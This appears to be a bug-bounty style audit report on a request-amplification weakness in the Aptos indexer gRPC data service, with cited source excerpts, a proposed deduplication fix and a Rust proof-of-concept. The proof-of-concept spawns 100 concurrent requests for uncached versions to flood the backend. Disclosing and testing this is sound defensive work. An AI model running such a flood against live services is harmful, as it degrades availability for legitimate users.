# Audit Report

## Title
Indexer gRPC Data Service Amplification Attack via Uncached Version Requests

## Summary
The `InMemoryCache::get_data()` function lacks deduplication for in-flight backend fetch requests, allowing attackers to send concurrent requests for uncached transaction versions that each trigger separate backend fetches, creating an N:1 amplification attack against the grpc-manager backend service.

## Finding Description

The indexer-grpc-data-service-v2 implements an in-memory cache for transaction data with a fallback mechanism to fetch missing data from the backend. When multiple clients request the same uncached version, or when a single attacker requests many different uncached versions, each request triggers an independent backend fetch without deduplication.

**Attack Flow:**

1. Attacker identifies the cache window by querying `min_servable_version` [1](#0-0) 

2. Attacker sends N concurrent requests for versions outside the cache window (e.g., old evicted versions or versions beyond cache capacity)

3. Each request spawns a separate async task [2](#0-1) 

4. Each task calls `get_data()` which checks the cache and finds the version missing [3](#0-2) 

5. Each task calls `fetch_past_data()` directly without checking for in-flight requests [4](#0-3) 

6. Each fetch triggers a backend gRPC call to grpc-manager [5](#0-4) 

**Root Cause:**

Unlike `continuously_fetch_latest_data()` which uses a `Shared<BoxFuture>` pattern for deduplication [6](#0-5) , the `fetch_past_data()` function has no such protection and directly calls the backend for every request [4](#0-3) 

Additionally, there is no rate limiting configured for the data service [7](#0-6) 

## Impact Explanation

This vulnerability allows attackers to amplify their request load by 10x-1000x against the backend grpc-manager infrastructure. A single malicious client can:

- Send 100 concurrent requests for different uncached versions â†’ triggers 100 backend fetches
- Overwhelm the grpc-manager with excessive load
- Degrade service quality for legitimate indexer users
- Potentially cause backend service crashes or timeouts

This constitutes **Medium severity** under the Aptos bug bounty program as it can cause:
- Significant service degradation requiring operational intervention to mitigate
- Resource exhaustion on critical indexer infrastructure
- Denial of service for legitimate API consumers

While this affects indexer infrastructure rather than core consensus, the indexer services are critical components of the Aptos ecosystem used by wallets, explorers, and dApps.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- No authentication or rate limiting prevents abuse
- Attacker only needs to know version numbers outside the cache window (easily discoverable)
- Can be automated with simple scripts
- No special privileges or insider access required
- The cache window is finite (configurable, default 5M slots) [8](#0-7) , so uncached versions always exist

## Recommendation

Implement fetch request deduplication similar to the `fetching_latest_data_task` pattern:

1. Add a `DashMap<u64, Shared<BoxFuture>>` to track in-flight fetch requests by version
2. Before fetching, check if a fetch for that version is already in progress
3. If yes, await the existing shared future
4. If no, create a new shared future and store it
5. Remove from map after fetch completes

Example fix in `fetch_manager.rs`:

```rust
use dashmap::DashMap;

pub(super) struct FetchManager<'a> {
    data_manager: Arc<RwLock<DataManager>>,
    data_client: Arc<DataClient>,
    pub(super) fetching_latest_data_task: RwLock<Option<FetchTask<'a>>>,
    in_flight_fetches: DashMap<u64, FetchTask<'a>>, // Add this
}

pub(super) async fn fetch_past_data(&'a self, version: u64) -> usize {
    let _timer = TIMER.with_label_values(&["fetch_past_data"]).start_timer();
    
    // Check for existing in-flight fetch
    if let Some(existing_task) = self.in_flight_fetches.get(&version) {
        return existing_task.value().clone().await;
    }
    
    // Create new shared fetch task
    let task = Self::fetch_and_update_cache(
        self.data_client.clone(),
        self.data_manager.clone(),
        version
    ).boxed().shared();
    
    self.in_flight_fetches.insert(version, task.clone());
    let result = task.await;
    self.in_flight_fetches.remove(&version);
    
    result
}
```

Additionally, consider implementing per-client rate limiting at the service layer.

## Proof of Concept

```rust
// Rust reproduction demonstrating amplification
use tokio;
use aptos_protos::indexer::v1::GetTransactionsRequest;

#[tokio::test]
async fn test_amplification_attack() {
    // Connect to indexer-grpc-data-service
    let client = connect_to_data_service().await;
    
    // Find an uncached version (e.g., old evicted version)
    let min_servable = get_min_servable_version(&client).await;
    let target_version = min_servable - 10000; // Outside cache
    
    // Spawn 100 concurrent requests for the same uncached version
    let mut handles = vec![];
    for _ in 0..100 {
        let mut client_clone = client.clone();
        let handle = tokio::spawn(async move {
            let request = GetTransactionsRequest {
                starting_version: Some(target_version),
                transactions_count: Some(10),
                ..Default::default()
            };
            
            let start = std::time::Instant::now();
            let _ = client_clone.get_transactions(request).await;
            start.elapsed()
        });
        handles.push(handle);
    }
    
    // Observe: All 100 requests trigger separate backend fetches
    // Monitor backend logs/metrics to confirm 100 fetch operations
    let results = futures::future::join_all(handles).await;
    
    // Alternative attack: Request 100 different uncached versions
    let mut handles = vec![];
    for i in 0..100 {
        let mut client_clone = client.clone();
        let version = target_version + i * 1000;
        let handle = tokio::spawn(async move {
            let request = GetTransactionsRequest {
                starting_version: Some(version),
                transactions_count: Some(10),
                ..Default::default()
            };
            let _ = client_clone.get_transactions(request).await;
        });
        handles.push(handle);
    }
    
    futures::future::join_all(handles).await;
    // Result: 100 concurrent backend fetches = 100x amplification
}
```

## Notes

This vulnerability affects the indexer-grpc infrastructure layer rather than core consensus components. However, it represents a genuine resource exhaustion attack that can degrade critical infrastructure services used throughout the Aptos ecosystem. The lack of request deduplication combined with no rate limiting creates a straightforward amplification vector that should be mitigated to ensure reliable indexer service availability.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L144-146)
```rust
    pub(crate) async fn get_min_servable_version(&self) -> u64 {
        self.in_memory_cache.data_manager.read().await.start_version
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L73-77)
```rust
            if data_manager.get_data(starting_version).is_none() {
                drop(data_manager);
                self.fetch_manager.fetch_past_data(starting_version).await;
                continue;
            }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/fetch_manager.rs (L34-38)
```rust
    pub(super) async fn fetch_past_data(&self, version: u64) -> usize {
        let _timer = TIMER.with_label_values(&["fetch_past_data"]).start_timer();
        Self::fetch_and_update_cache(self.data_client.clone(), self.data_manager.clone(), version)
            .await
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/fetch_manager.rs (L40-46)
```rust
    pub(super) async fn continuously_fetch_latest_data(&'a self) {
        loop {
            let task = self.fetch_latest_data().boxed().shared();
            *self.fetching_latest_data_task.write().await = Some(task.clone());
            let _ = task.await;
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/data_client.rs (L18-43)
```rust
    pub(super) async fn fetch_transactions(&self, starting_version: u64) -> Vec<Transaction> {
        trace!("Fetching transactions from GrpcManager, start_version: {starting_version}.");

        let request = GetTransactionsRequest {
            starting_version: Some(starting_version),
            transactions_count: None,
            batch_size: None,
            transaction_filter: None,
        };
        loop {
            let mut client = self
                .connection_manager
                .get_grpc_manager_client_for_request();
            let response = client.get_transactions(request.clone()).await;
            if let Ok(response) = response {
                let transactions = response.into_inner().transactions;
                if transactions.is_empty() {
                    return vec![];
                }
                if transactions.first().unwrap().version == starting_version {
                    return transactions;
                }
            }
            // TODO(grao): Error handling.
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L67-69)
```rust
    fn default_num_slots() -> usize {
        5_000_000
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L85-96)
```rust
pub struct IndexerGrpcDataServiceConfig {
    pub(crate) chain_id: u64,
    pub(crate) service_config: ServiceConfig,
    pub(crate) live_data_service_config: LiveDataServiceConfig,
    pub(crate) historical_data_service_config: HistoricalDataServiceConfig,
    pub(crate) grpc_manager_addresses: Vec<String>,
    pub(crate) self_advertised_address: String,
    #[serde(default = "IndexerGrpcDataServiceConfig::default_max_transaction_filter_size_bytes")]
    pub(crate) max_transaction_filter_size_bytes: usize,
    #[serde(default = "IndexerGrpcDataServiceConfig::default_data_service_response_channel_size")]
    pub data_service_response_channel_size: usize,
}
```
